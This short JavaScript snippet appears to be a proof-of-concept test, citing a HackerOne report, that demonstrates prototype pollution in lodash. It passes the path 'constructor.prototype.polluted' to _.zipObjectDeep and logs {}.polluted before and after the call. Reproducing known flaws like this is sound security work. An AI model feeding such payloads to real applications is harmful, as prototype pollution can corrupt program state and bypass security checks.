// // https://hackerone.com/reports/712065
// test("prototype pollution in lodash", () => {
console.log({}.polluted);

  const _ = require("lodash");
  //_.zipObjectDeep(["__proto__.polluted"], ["yes"]);
  _.zipObjectDeep(["constructor.prototype.polluted"], ["yes"]);

console.log({}.polluted);
// });
